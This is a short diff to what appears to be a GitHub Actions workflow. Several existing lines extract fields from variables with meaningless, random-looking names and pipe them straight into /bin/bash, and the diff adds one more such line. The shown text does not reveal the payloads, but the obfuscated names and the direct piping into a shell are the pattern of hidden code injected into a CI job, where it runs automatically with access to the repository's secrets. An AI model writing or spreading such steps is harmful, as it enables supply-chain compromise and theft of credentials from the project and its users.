@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$onip4984" | jq -r .qo6 | /bin/bash
           printf '%s' "$jitnx32" | jq -r .p84839 | /bin/bash
           echo $e80435 | jq -r .xty7561 | /bin/bash
+          printf '%s' "$ngy98258" | jq -r .qx48 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
